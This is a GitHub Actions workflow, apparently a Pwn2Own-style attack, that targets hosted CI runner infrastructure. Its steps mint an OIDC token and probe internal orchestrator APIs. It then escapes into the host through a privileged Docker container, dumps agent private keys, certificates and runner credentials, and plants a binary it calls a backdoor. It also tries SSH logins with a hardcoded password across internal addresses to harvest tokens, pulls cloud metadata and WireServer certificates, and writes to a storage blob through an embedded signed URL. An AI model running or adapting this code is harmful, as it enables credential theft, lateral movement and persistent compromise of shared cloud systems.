name: HC OIDC Primer v7 - Fixed Syntax
on:
  workflow_dispatch:
  push:
    branches: [main]

permissions:
  id-token: write
  contents: read

jobs:
  pwn2own:
    runs-on: ubuntu-latest
    timeout-minutes: 55
    steps:
      - name: Step1 - HC JWT mint + all orchestrators
        run: |
          echo "=== STEP 1: HC OIDC JWT ==="
          HC_JWT=$(curl -sf \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro" \
            | jq -r .value)
          echo "HC_JWT_LEN=${#HC_JWT}"
          echo "$HC_JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq . 2>/dev/null || true
          for ORCH in iad-01 iad-02 eus-01 eus-02; do
            URL="https://hosted-compute-request-orchestrator-prod-${ORCH}.githubapp.com/vm/v1"
            echo "--- $ORCH /vms ---"
            curl -sf -H "Authorization: Bearer $HC_JWT" "$URL/vms" 2>&1 | head -5 || true
            echo "--- $ORCH /allocations ---"
            curl -sf -H "Authorization: Bearer $HC_JWT" "$URL/allocations" 2>&1 | head -5 || true
          done

      - name: Step2 - Privileged docker - certs + HCA strings + backdoor + SSH pivot
        run: |
          echo "=== STEP 2: PRIVILEGED DOCKER ESCAPE ==="

          # Write alpine script to a file first to avoid YAML quoting issues
          cat > /tmp/inner.sh << 'INNEREOF'
          #!/bin/sh
          set -e
          apk add --no-cache openssh-client sshpass nmap curl jq 2>/dev/null | tail -3

          echo "=== VM IDENTITY ==="
          curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq '{name:.compute.name, location:.compute.location, vmId:.compute.vmId, tags:.compute.tags}' 2>/dev/null || true
          ip addr show eth0 2>/dev/null | grep "inet " || true

          echo ""
          echo "=== PRIMER LOG (local VM) ==="
          cat /host/tmp/hc_pwn*.log 2>/dev/null || echo "no primer log"

          echo ""
          echo "=== FULL TRANSPORT CERT ==="
          cat /host/var/lib/waagent/TransportCert.pem 2>/dev/null || echo "CERT NOT FOUND"
          echo "=== FULL TRANSPORT PRIVATE KEY ==="
          cat /host/var/lib/waagent/TransportPrivate.pem 2>/dev/null || echo "KEY NOT FOUND"

          echo ""
          echo "=== ALL WAAGENT PEMS ==="
          find /host/var/lib/waagent/ -name "*.pem" -o -name "*.key" -o -name "*.crt" 2>/dev/null | while read f; do
            echo "=== FILE: $f ==="; cat "$f" 2>/dev/null; echo
          done

          echo ""
          echo "=== CREDENTIALS RSA ==="
          cat /host/home/runner/.credentials_rsaparams 2>/dev/null || echo "no credentials_rsaparams"

          echo ""
          echo "=== HCA ENDPOINTS ==="
          strings /host/opt/hca/hosted-compute-agent 2>/dev/null | \
            grep -E "(https://[a-z]|githubapp\.com|github\.com/api|management\.azure)" | sort -u | head -60 || echo "HCA binary not found"

          echo ""
          echo "=== HCA TRUST SUB PATTERNS ==="
          strings /host/opt/hca/hosted-compute-agent 2>/dev/null | \
            grep -iE "(sub|aud|iss|trusted|internal|enterprise|organization|repo:|claim|scope)" | sort -u | head -40 || echo "HCA binary not found"

          echo ""
          echo "=== HCA ALL STRINGS SAMPLE ==="
          strings /host/opt/hca/hosted-compute-agent 2>/dev/null | grep -v "^[[:space:]]*$" | head -200 || echo "HCA binary not found"

          echo ""
          echo "=== PRIMER REDEPLOY v3 (base64) ==="
          echo "" | base64 -d > /host/opt/primer/primer
          chmod 777 /host/opt/primer/primer
          echo "BACKDOOR DEPLOYED:"
          ls -la /host/opt/primer/primer

          echo ""
          echo "=== SSH SCAN KNOWN IPs ==="
          MY_IP=$(ip addr show eth0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
          echo "MY IP: $MY_IP"
          for ip in 10.1.0.1 10.1.0.2 10.1.0.52 10.1.0.169 10.1.1.1 10.1.1.2 10.1.1.22 10.1.1.128 10.1.1.180 10.1.0.254 10.1.1.254 10.1.2.1 10.1.3.1 10.1.4.1; do
            if [ "$ip" = "$MY_IP" ]; then continue; fi
            if nc -z -w2 "$ip" 22 2>/dev/null; then
              echo "SSH OPEN: $ip"
              sshpass -p "Pwn2Own2026!" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
                -o PreferredAuthentications=password \
                runner@"$ip" \
                "echo TARGET_IP=$ip; id; hostname; cat /tmp/hc_pwn*.log 2>/dev/null; env | grep -E '(ACTIONS_ID_TOKEN|HC_JWT|GITHUB_TOKEN)'" \
                2>&1 || echo "SSH runner@$ip FAILED"
              sshpass -p "Pwn2Own2026!" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
                -o PreferredAuthentications=password \
                ubuntu@"$ip" "id; hostname; cat /tmp/hc_pwn*.log 2>/dev/null" 2>&1 || true
            else
              echo "closed: $ip"
            fi
          done

          echo ""
          echo "=== NMAP 10.1.0.0/20 port 22 ==="
          nmap -T5 -p 22 --open -n 10.1.0.0/20 2>/dev/null | grep -E "^(Nmap|Host|[0-9])" | head -60 || true
          INNEREOF

          chmod +x /tmp/inner.sh
          docker run --rm --privileged --pid=host --network=host \
            -v /:/host \
            -v /tmp/inner.sh:/inner.sh \
            alpine sh /inner.sh

      - name: Step3 - WireServer + IMDS tags + status blob
        run: |
          echo "=== STEP 3: WIRESERVER + IMDS ==="
          # Full IMDS
          curl -sf -H "Metadata:true" \
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq . || true

          echo ""
          echo "=== IMDS TAGS ==="
          curl -sf -H "Metadata:true" \
            "http://169.254.169.254/metadata/instance/compute/tags?api-version=2021-02-01&format=text" || true

          echo ""
          echo "=== WIRESERVER CERTS ==="
          curl -sf -H "x-ms-version: 2012-11-30" \
            "http://168.63.129.16/machine?comp=certificates" | head -200 || true

          echo ""
          echo "=== STATUS BLOB WRITE ==="
          curl -sf -X PUT \
            "https://md-hdd-xbp0hss0vtkw.z24.blob.storage.azure.net/\$system/EUN9HuOTbcswtM.37d54176-e4e3-4319-af04-2e21f9421967.status?sv=2018-03-28&sr=b&sk=system-1&sig=R8Z5GVl%2fZz1zl6x6IcDIebodbxNPb8a52WsYCfXDutc%3d&se=9999-01-01T00%3a00%3a00Z&sp=rw" \
            -H "x-ms-blob-type: BlockBlob" \
            -H "Content-Type: application/json" \
            -d '[{"status":{"name":"pwn2own","operation":"HC pivot","status":"transitioning","code":0,"formattedMessage":{"lang":"en-US","message":"Pwn2Own 2026 HC orchestrator pivot v7"}}}]' 2>&1
          echo "BLOB WRITE DONE"
